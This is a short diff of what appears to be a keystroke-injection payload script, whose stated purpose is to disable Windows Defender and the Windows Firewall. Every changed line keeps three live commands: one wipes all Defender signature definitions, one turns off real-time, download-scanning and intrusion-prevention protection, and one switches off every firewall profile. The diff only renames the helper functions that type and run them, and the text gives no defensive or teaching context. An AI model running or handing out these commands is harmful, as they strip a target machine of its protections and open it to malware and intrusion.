@@ -4,11 +4,11 @@
 Disable Windows Defender and Firewall.
 '
 
-paste_command "cmd.exe /c \"C:\Program Files\Windows Defender\MpCmdRun.exe\" -removedefinitions -all"
-xdotool key Return
+execute_command "cmd.exe /c \"C:\Program Files\Windows Defender\MpCmdRun.exe\" -removedefinitions -all"
+create_new_line
 
-paste_command "Set-MpPreference -DisableIntrusionPreventionSystem \$true -DisableIOAVProtection \$true -DisableRealtimeMonitoring \$true"
-xdotool key Return
+execute_command "Set-MpPreference -DisableIntrusionPreventionSystem \$true -DisableIOAVProtection \$true -DisableRealtimeMonitoring \$true"
+create_new_line
 
-paste_command "NetSh Advfirewall set allprofiles state off"
-xdotool key Return
+execute_command "NetSh Advfirewall set allprofiles state off"
+create_new_line
